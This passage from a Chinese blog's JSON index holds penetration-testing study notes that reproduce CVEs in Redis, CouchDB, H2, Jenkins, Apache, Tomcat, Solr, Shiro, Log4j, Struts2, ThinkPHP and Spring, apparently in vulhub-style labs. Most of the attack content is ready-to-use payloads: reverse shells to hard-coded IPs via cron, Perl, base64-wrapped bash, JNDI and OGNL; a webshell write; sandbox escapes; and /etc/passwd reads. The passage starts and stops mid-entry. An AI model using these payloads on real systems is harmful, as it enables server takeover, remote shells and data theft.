造成资源占用，达到拒绝服务的目的\n压缩包炸弹和测试页面的网盘链接：\nhttps://pan.baidu.com/s/1pa0OA6R5vckTDchYvvqdfw?pwd=4291\n\n\n\n\n需要看网站本身是做什么功能的，要根据网站功能决定\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"078-服务攻防-数据库应用&利用项目脚本&环境等","url":"/2025/09/16/078-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8&%E5%88%A9%E7%94%A8%E9%A1%B9%E7%9B%AE%E8%84%9A%E6%9C%AC&%E7%8E%AF%E5%A2%83%E7%AD%89/","content":"078-服务攻防-数据库应用&amp;利用项目脚本&amp;环境等知识点1、数据库-Redis-未授权RCE&amp;CVE\n2、数据库-Couchdb-未授权RCE&amp;CVE\n3、数据库-H2database-未授权RCE&amp;CVE\n前置知识：1、复现环境：Vulfocus(官方在线的无法使用)\n官方手册：https://fofapro.github.io/vulfocus/#/\n搭建踩坑：（无法同步）\nhttps://blog.csdn.net/m0_64563956/article/details/131229046\n服务判断端口扫描：利用服务开启后目标端口开放判断（比如redis的6379端口）\n组合判断：利用搭建常见组合分析可能开放服务（比如使用java当作脚本语言，那可能就会使用SpringBoot开发框架）\n信息来源：访问端口提示软件版本，应用信息等（这个就是当你访问的时候直接显示出来的版本或者特征信息）\n强弱特征：如框架shiro强特征rememberMe,SpringBoot默认页面等\n对象类别对服务进行类别划分，通过服务功能理解，如数据库有帐号密码就有爆破利用方法，也可以针对服务公开的CVE进行漏洞测试及服务常见的错误安全配置导致的未授权访问等。\n利用方法主要集中在CVE漏洞，未授权访问，弱口令爆破等\n在进行复现之前，需要先将vulfocus靶场搭建起来。\n数据库应用-Redis-未授权访问&amp;CVE漏洞默认端口：6379\nRedis是一套开源的使用ANSI C编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。Redis如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。\n漏洞复现\n沙箱绕过RCE-CVE-2022-0543\n使用payload命令执行1. 执行命令获取id\neval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0\n\n\n执行命令ls &#x2F;tmp获取flag\n\neval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls /tmp&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0\n\n\n\n\n未授权访问-CNVD-2019-21763由于在Reids4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行\n工具利用：GitHub - vulhub&#x2F;redis-rogue-getshell: redis 4.x&#x2F;5.x master&#x2F;slave getshell module\nPOC利用：\npython redis-master.py-r 目标-p 目标端口 -L攻击IP -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;\n\n\n\n未授权访问：CNVD-2015-07557漏洞复现\n目标系统的权限不够redis用户无法写计划任务和公钥，而且也没有开放ssh端口。主从复制getshell，写入恶意的so文件达到执行系统命令的目的。github上有一键可以利用的脚本https://github.com/n0b0dyCN/redis-rogue-server.git\n\n写Webshell需得到Web路径\n\n利用条件：Web目录权限可读写\n\nconfig set dir /tmp            #设置WEB写入目录\n\nconfig set dbfilename 1.php    #设置写入文件名\n\nset test &quot;&lt;?php phpinfo();?&gt;&quot;  #设置写入文件代码\n\nsave                           #保存执行\n注意：部分web目录可能会没读写权限\n   * ![image-20250708205423354](/img/image-20250708205423354.png)   * ![image-20250708205607403](/img/image-20250708205607403.png)2. 写定时任务反弹shell(需要等待1-2分钟才会反弹)   * 利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态   * ```     set shell &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\\n\\n&quot;          config set dir /var/spool/cron/          config set dbfilename root          save\n\n\n注意：centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败\n\n\n\n写入Linux ssh-key公钥\n\n本地生成公钥和私钥\n将公钥写入到目标的.ssh文件夹\n本地私钥ssh 连接\n攻击机：ssh-keygen -t rsa  &#x2F;&#x2F;执行生成key命令\n\n\n自动化项目\n\n这个项目集成了上面的那几种方式使用较为方便\n\n这个自动化项目也是需要make一下，这里注意一下目录是在RedisModulesSDK 下的exp目录下make\n\nGitHub - n0b0dyCN&#x2F;redis-rogue-server: Redis(&lt;&#x3D;5.0.5) RCE\n\npython3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 公网IP\n   * ![image-20250708211140364](/img/image-20250708211140364.png)## **数据库应用-Couchdb-未授权越权&amp;CVE漏洞**默认端口：5984Apache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露利用### **Couchdb 垂直权限绕过（CVE-2017-12635）**1. 先创建用户   * ```     PUT /_users/org.couchdb.user:xiaodi HTTP/1.1          Host: 47.94.236.117:44389          Accept: */*          Accept-Language: en          User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)          Connection: close          Content-Type: application/json          Content-Length: 108          &#123;            &quot;type&quot;: &quot;user&quot;,            &quot;name&quot;: &quot;xiaodi&quot;,            &quot;roles&quot;: [&quot;_admin&quot;],            &quot;roles&quot;: [],            &quot;password&quot;: &quot;xiaodi&quot;          &#125;\n\n\n\n\n\n\n\n\n\n\n\nCouchdb 命令执行 （CVE-2017-12636）https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py\n1、下载exp.py2、修改目标和反弹地址3、Python3调用执行即可\n\n\n\n\n数据库应用-H2database–未授权访问&amp;CVE漏洞默认端口：20051\nJava SQL 数据库 H2,H2的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。\nH2database RCE(CVE-2022-23221)\n未授权进入\n\njdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;\\\n   * ![image-20250708221421257](/img/image-20250708221421257.png)   * ![image-20250708221435644](/img/image-20250708221435644.png)2. RCE执行反弹   * 攻击机上完成，创建数据库文件：h2database.sql   * ```     #吧下面这段代码写入创建好的文件里面     CREATE TABLE test (               id INT NOT NULL           );          CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS &#x27;//javascript          Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,base64加密的反弹shell指令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);&#x27;;          #反弹指令示例：bash -i &gt;&amp; /dev/tcp/x.x.x.x/6666 0&gt;&amp;1\n\n\n\n\n\n\n启动提供SQL文件远程加载服务\n\npython3 -m http.server 89\n* ![image-20250708221711830](/img/image-20250708221711830.png)* 目标填入Payload使其加载远程SQL* ```  jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM &#x27;http://1.92.144.175:89/h2database.sql&#x27;;\\\n\n\n完结\n\n\n\n\nJNDI注入\n\n将生成出来的所提供的服务，输入到界面当中，进行连接指定驱动类：javax.naming.InitialContext\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"080-服务攻防-工具箱&WPS复现&其他项目等","url":"/2025/09/16/080-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%B7%A5%E5%85%B7%E7%AE%B1&WPS%E5%A4%8D%E7%8E%B0&%E5%85%B6%E4%BB%96%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"080-服务攻防-工具箱&amp;WPS复现&amp;其他项目等应用WPS-HW2023-RCE执行&amp;复现&amp;上线CS金山WPS RCE\nwps影响范围为:WPS Office 2023 个人版&lt; 11.1.0.15120\nWPS Office 2019 企业版&lt; 11.8.2.12085\nPOC在1.html当前路径下启动http server并监听80端口，修改hosts文件(测试写死的)127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn漏洞触发需让域名规则满足\nclientweb.docer,wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系\n代码块在底下。(需要原pdf加wechat)\n1、简单复现网上 POC分析1.html poc.docx\n使用python环境启动\npython --m http.server 80\n\n\n\t\n\n\n2、修改配合联动上线CS-修改 html 中的 shellcode(C#)-修改 docx 中的指向连接 URL-修改 hosts 绑定执行域名规则漏洞触发需让域名规则满足 clientweb.docer.wps.cn.{xxxxx}wps.cn\n\n\n\n\n\n\n\n中间件-Weblogic-CVE&amp;反序列化&amp;RCEweblogic是Oracle 公司推出的 J2EE 应用服务器\n探针默认端口:7001CVE-2023-21839(JNDI)CVE-2020-2551(JRMP)CVE-2020-2551CVE-2020-2555CVE-2020-2883CVE-2020-14882未授权访问CVE-2018-2894CVE-2018-2628(JRMP)CVE-2018-2893(JRMP)CVE-2018-3245(JRMP)CVE 20183252(JRMP)CVE 2018 3191CVE-2016-3510CVE-2016-0638CVE-2017-10271\nCVE-2017-3248(JRMP)CVE-2015-4852https://github.com/KimJun1010/WeblogicTool\n\n\n中间件-Jenkins-CVE&amp;RCE 执行Jenkins 是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作。探针默认端口:8080\n1、cve-2017-1000353 JDK-1.8.0 291 其他版本失效bash -i &gt;&amp; /dev/tcp/IP地址/端口  0&gt;&amp;1\n\n\n使用工具进行利用\n项目地址：http://github.com/vulhub/CVE-2017-1000353\njava -jar CVE-2017-1000353-1.1-SNAPSH0T-all.jar jenkins poc.ser&quot;bash -c\n\n\n\n\npython exploit.py IP地址：端口 jenkins poc.ser\n\n\n\n2、CVE-2018-1000861项目地址：https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1\npython3 -m http.server 8888 \npython2 exp.py http://123.58.236.76:52281/&quot;curl -o &#x2F;tmp&#x2F;1.shhttp://47.94.236.117:8888/shell.txt“\npython2 exp.py http://123.58.236.76:52281/ “bash &#x2F;tmp&#x2F;1.sh”\n\n\n\n\n\n中间件-Jetty-CVE&amp;信息泄漏Jetty是一个开源的 servlet 容器，它为基于 Ja亚a 的 Web 容器提供运行环境。&#x2F;号2e&#x2F;WEB-INF&#x2F;web.xml&#x2F;.号00&#x2F;WEB-INF&#x2F;web.xml&#x2F;号u002e&#x2F;WEB-INF&#x2F;web.xm1&#x2F;static?&#x2F;WEB-INF&#x2F;web.xm1&#x2F;a&#x2F;b&#x2F;..号00&#x2F;WEB-INF&#x2F;web.\n黑盒:直接访问路径地址即可\n\t\n中间件直接使用工具梭哈\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"079-服务攻防-中间件安全&CVE及利用脚本等","url":"/2025/09/16/079-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8&CVE%E5%8F%8A%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%AD%89/","content":"079-服务攻防-中间件安全&amp;CVE及利用脚本等一、演示案例-中间件-IIS-短文件&amp;文件解析&amp;蓝屏&amp;写权限1、HTTP.SYS（CVE-2015-1635）主要用作蓝屏破坏，跟权限不挂钩1、漏洞描述远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n2、影响版本Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2\n3、漏洞利用条件安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本\n4、漏洞复现(蓝屏)\nmsfconsoleuse auxiliary/dos/http/ms15_034_ulonglongaddset rhosts xx.xx.xx.xxset rport xxrun\n\n\n\n参考地址：HTTP.sys远程代码执行漏洞复现-CSDN博客(curl这个命令powershell自带)\n2、IIS短文件(iis全版本都可能有这个问题)1、此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。\n2、漏洞成因:为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x\n3、应用场景：后台路径获取，数据库文件获取，其他敏感文件获取等\n4、利用工具(可以指定目录扫描，不仅仅只是网站根目录)：https://github.com/lijiejie/IIS_shortname_Scanner(py版本)只能探针前6位\n\n3、IIS文件解析应用场景：配合文件上传获取Webshell\nIIS 6 解析漏洞1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析2、该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。如：logo.asp;.jpg xx.asp&#x2F;logo.jpg\nIIS 7.x 解析漏洞在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件\n4、IIS写权限IIS&lt;=6.0 目录权限开启写入，开启WebDAV，设置为允许\n\n\n\n\ngetshell参考：题目2-IIS写权限漏洞分析溯源-腾讯云开发者社区-腾讯云\n二、演示案例-中间件-Nginx-文件解析&amp;目录穿越漏洞&amp;CRLF1、CVE-2013-4547 文件上传影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7Vulhub - Docker-Compose file for vulnerability environment\n条件：\n1.符合的漏洞版本2.文件上传点\n\n\n\n\n\n2、解析漏洞(配置不当)\n\n3、目录穿越(配置不当)Payload: http://your-ip:8081/files../ ，成功穿越到根目录：\n\n4、CRLF注入（配置不当）\n%0a`是换行 `%0d`是回车检测：手工检测方式 `%0aSet-cookie:JSPSESSID%3Ddrops\n\n\n\n工具检测CRLFuzz：https://github.com/dwisiswant0/crlfuzz/releases支持单个目标和批量目标\n\n\n\n没有漏洞payload测试\n\n\n有漏洞payload测试\n\n\n5、cve-2021-23017 无 EXP6、cve-2017-7529 意义不大三、演示案例-中间件-Apache-RCE&amp;目录遍历&amp;文件解析Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本\n1.cve_2021_42013 RCE请求地址：POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh\n\n\n\n\n\necho;perl -e &#x27;use Socket;$i=&quot;47.94.236.117&quot;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n\n\n2、cve_2021_41773 目录穿越Apache HTTP Server 2.4.49、2.4.50 版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到 web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器\n\ncurl -v --path-as-is IP地址:端口号/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd\n\n\n\n\n\n\n可以通过bp抓取数据包后将数据包内的地址修改成下面的样式。\n修改url末尾的文件路径达到文件任意读取的目的\n\n\n3、cve-2017-15715文件解析Apache HTTPD是一款 HTTP 服务器。其 2.4.0~2.4.29 版本存在一个解析漏洞，在解析 PHP 时，1.php\\x0A将被按照 PHP后缀进行解析，导致绕过一些服务器的安全策略。\n4、cve-2017-9798​    价值不高。\n5、cve-2018-11759​    价值不高。\n6、cve-2021-37580​    插件问题。\n四、演示案例-中间件-中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含1、后台弱口令猜解1、弱口令猜解https://github.com/BeichenDream/Godzilla\n配置不当导致后台弱口令(admin/admin、tomcat/tomcat)，可通过上传jsp压缩包改名的war拿shell\n-先爆破弱口令-后门压缩 zip 改 war-上传 war 访问链接I\nTomcat存在后台管理，账号密码设置在conf/tomcat-users.xml\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n2、cve-2017-12615文件上传当存在漏洞的Tomcat运行在Windows&#x2F;Linux主机上，且启用了HTTP PUT请求方法(例如，将readonly初始化参数由默认值设置为false)，攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包合任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。影响版本：Apache Tomcat 7.0.0-7.0.79\nPUT /x.jsp/PUT /xx.jsp%20   #基于linux服务器PUT /xxx.jsp::$DATA #基于windows服务器\n\n\n\n\n\n3、cve-2020-1938文件读取Apache TomcatAJP协议(默认8009端口)由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。影响版本：\nTomcat 6.*Tomcat 7.*&lt; 7.0.100Tomcat 8.*&lt; 8.5.51Tomcat 9. &lt; 9.0.31\n\nhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\nD:Python2.7\\python.exe \\CNVD-2020-10487-Tomcat-Ajp-lfi.py 47.98.193.176 -p 35839 -f WEB-INF/web.xml\n\n\n\n4、cve-2020-11996\n拒绝服务\n危害过大，权限无关，意义不大。\n\n5、cve-2020-9484\n反序列化\n条件苛刻，意义不大。\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"082-服务攻防-J2EE组件安全&solr&shiro&log4j等","url":"/2025/09/16/082-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-J2EE%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8&solr&shiro&log4j%E7%AD%89/","content":"082-服务攻防-J2EE组件安全&amp;solr&amp;shiro&amp;log4j等知识点：\n1、J2EE-组件安全-Solr-全文搜索\n2、J2EE-组件安全-Shiro-身份验证\n3、J2EE-组件安全-Log4J-日志记录\n常见语言开发框架：\nPHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等JAVA：Spring MyBatis Hibernate Struts2 Springboot等Python：Django Flask Bottle Turbobars Tornado Web2py等Javascript：Vue.js Node.js Bootstrap JQuery Angular等\n常见语言开发组件：(Java)：Apache Solr、Apache Shiro、Apache Struts2、Apache Flink、Flume、Dubbo、Redis、Logstash、ElasticSearch、Kafka、Ghidra、Minecraft、Apache hive、Datax、Streaming、Dolphin Scheduler、Storm、Spring、Aibaba FastJson、Jackson、Log4J、XSteam等。\nJ2EE-组件Solr-本地demo&amp;CVE主要基于HTTP和Apache Lucene实现的全文搜索服务器。\n黑盒特征：图标及端口8983\n\n\n命令执行（CVE-2019-17558）影响版本：[Apache Solr](https://so.csdn.net/so/search?q=Apache Solr&amp;spm&#x3D;1001.2101.3001.7020) 5.0.0版本至8.3.1\n利用项目：https://github.com/jas502n/solr_rce\n\n远程命令执行漏洞(CVE-2019-0193)影响版本：Apache Solr &lt; 8.2.0版本\nhttps://vulhub.org/#/environments/solr/CVE-2019-0193/\n条件1：Apache Solr的DataImportHandler启用了模块DataImportHandler(默认不会被启用)\n\n条件2：Solr Admin UI未开启鉴权认证。（默认情况无需任何认证）\n\n选择已有核心后选择Dataimport功能并选择debug模式，更改填入以下POC，点击Execute with this Confuguration\n&lt;dataConfig&gt;  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;  &lt;script&gt;&lt;![CDATA[          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);          &#125;  ]]&gt;&lt;/script&gt;  &lt;document&gt;    &lt;entity name=&quot;stackoverflow&quot;            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;            processor=&quot;XPathEntityProcessor&quot;            forEach=&quot;/feed&quot;            transformer=&quot;script:poc&quot; /&gt;  &lt;/document&gt;&lt;/dataConfig&gt;\n\n\n\nApache Solr 文件读取&amp;SSRF (CVE-2021-27905)全版本官方拒绝修复漏洞\n获取数据库名\nhttp://IP:端口/solr/admin/cores?indexInfo=false&amp;wt=json\n\n\n\n访问触发POC\n\ncurl -i -s -k -X $&#x27;POST&#x27; \\&#123;% raw %&#125;    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\\&quot;set-property\\&quot;:&#123;\\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\\&quot;:true&#125;&#125;&#x27; \\    $&#x27;http://47.94.236.117:8983/solr/demo/config&#x27;\n\n\n\n\n任意文件读取\ncurl -i -s -k &#x27;http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;\n\n\nJ2EE-组件Shiro-本地demo&amp;CVEJava安全框架，能够用于身份验证、授权、加密和会话管理。\n黑盒特征：数据包cookie里面rememberMe\n白盒审计：看调用的shiro库对应版本是否爆过漏洞\n历史漏洞:https://avd.aliyun.com/search?q=Shiro\n\n\n\n\nCVE_2016_4437 Shiro-550+Shiro-721(RCE)影响范围：Apache Shiro &lt;&#x3D; 1.2.4\n工具直接搜哈 \n\n\n\nCVE-2020-11989(身份认证绕过)Poc：&#x2F;admin&#x2F;%20\n影响范围：Apache Shiro &lt; 1.7.1\n\n\n\nCVE-2020-1957(身份认证绕过)Poc：&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;\n影响范围：Apache Shiro &lt; 1.5.3\nCVE-2022-32532(身份验证绕过)Poc： /permit/any\n/permit/a%0any可绕过，需要依赖代码具体写法，无法自动化，风险较低。\n影响范围：Apache Shiro &lt; 1.9.1\nJ2EE-组件Log4j-本地demo&amp;CVEApache的一个开源项目，是一个基于Java的日志记录框架。\n黑盒特征：盲打 会问蓝队攻击特征（${jndi:rmi:&#x2F;&#x2F;&#x2F;osutj8}）\nLog4j2远程命令执行（CVE-2021-44228）漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1\n\n\n\n\n生成反弹Shell的JNDI注入\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 47.94.236.117\n\n\n\n构造JNDI注入Payload提交\n$&#123;jndi:rmi://47.94.236.117:1099/osutj8&#125;\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"081-服务攻防-java&php框架&demo源码&工具项目等","url":"/2025/09/16/081-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-java&php%E6%A1%86%E6%9E%B6&demo%E6%BA%90%E7%A0%81&%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"081-服务攻防-java&amp;php框架&amp;demo源码&amp;工具项目等1、PHP-框架安全-Thinkphp&amp;Laravel\n2、J2EE-框架安全-SpringBoot&amp;Struts2\n章节点:1、目标判断-端口扫描&amp;组合判断&amp;信息来源\n2、安全问题-配置不当&amp;CVE 漏洞&amp;弱口令爆破\n3、复现对象-数据库&amp;中间件&amp;开发框架&amp;应用协议\n4、HW 复现-近几年新洞-除上述外的对象各种应用\n#常见语言开发框架:PHP:Thinkphp Laravel YII Codelqniter CakePHP end等JAVA:Spring MyBatis Hibernate Struts2 Springboot等Python: Django Flask Bottle Turbobars Tornado Web2py等Javascript:Vue.js Node.js Bootstrap JQuery Angular 等\nPHP-框架安全-Thinkphp&amp;LaravelLaravel是一套简洁、优雅的 PHP Web开发框架(PHP Web Framework)。\n1、CVE-2021-3129 RCE影响范围：Laravel&lt;&#x3D;8.4.2\nhttps://github.com/zhzyker/CVE-2021-3129https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP\n\n\n\n\n\nThinkphp-3.X RCE-6.X RCE1、ThinkPHP 是一套开源的、基于 PHP 的轻量级 web 应用开发框架综合工具:武器库-Thinkphp专检(3-6版本)\n\n2、6.X lang RCEhttps://blog.csdn.net/m0 71518346&#x2F;article&#x2F;detaihs&#x2F;128360317\n?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($ REQUEST[&#x27;x&#x27;]);?&gt;+/var/www/html/x.php\n\n\n\n\t\nJ2EE-框架安全-SpringBoot&amp;struts2Struct2Apache struts2框架是一个使用 JavaEE 网络应用程序的 web 框架可能存在 OGNL, 表达注入扩展，从而造成远程代码执行，风险极大。\n1、旧漏洞(CVE-2016-0785等影响范围：Apache Struts 2.0.0-2.5.25\nhttps://qithub.com/YanMu2020/s2-062\npython \\s2-062.py --url http://47.98.193.176:18588/--cmd id\n\n流量特征：\n\n\n\nstruts2 代码执行 （CVE-2020-17530）s2-061影响版本：Apache Struts 2.0.0 - 2.5.25\n(该脚本支持S2-062 (CVE-2021-31805) &#x2F; S2-061 &#x2F; S2-059 RCE)\nhttps://github.com/YanMu2020/s2-062\n\nStruts2 代码执行 （CVE-2021-31805）s2-062影响版本：Apache Struts 2.0.0 - 2.5.29\n\n\n\npost /s2_062/index.action name=(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40&#123;&#125;).toString().substring(0,0)+%2b (%23request.map.setBean(%23request.get(&#x27;struts.valueStack&#x27;))+%3d%3d+true).toString().substring(0,0)+%2b (%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40&#123;&#125;).toString().substring(0,0)+%2b (%23request.map2.setBean(%23request.get(&#x27;map&#x27;).get(&#x27;context&#x27;))+%3d%3d+true).toString().substring(0,0)+%2b (%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40&#123;&#125;).toString().substring(0,0)+%2b (%23request.map3.setBean(%23request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;))+%3d%3d+true).toString().substring(0,0)+%2b (%23request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,%23%40org.apache.commons.collections.BeanMap%40&#123;&#125;.keySet())+%3d%3d+true).toString().substring(0,0)+%2b (%23request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,%23%40org.apache.commons.collections.BeanMap%40&#123;&#125;.keySet())+%3d%3d+true).toString().substring(0,0)+%2b (%23application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;bash -c &#123;echo,%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%30%4e%54%51%67%4d%44%34%6d%4d%51%3d%3d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;))\n\n\n\nSpring BootSpring Boot 目录遍历 （CVE-2021-21234）Spring-boot-actuator-logview 0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。\nwindowshttp://127.0.0.1:8887/manage/log/view?filename=/windows/win.ini&amp;base=../../../../../../../linuxhttp://47.98.193.176:8908/manage/log/view?filename=etc/passwd&amp;base=../../../../../../\n\n\nSpring Cloud Function Spel表达式注入 CVE-2022-22963Spring Cloud Function提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像Amazon AWS Lambda这样的 FaaS（函数即服务，function as a service）平台。\n影响版本：3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2\n复现参考：https://developer.aliyun.com/article/1160011\npayloadPOST：/functionRouter spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c 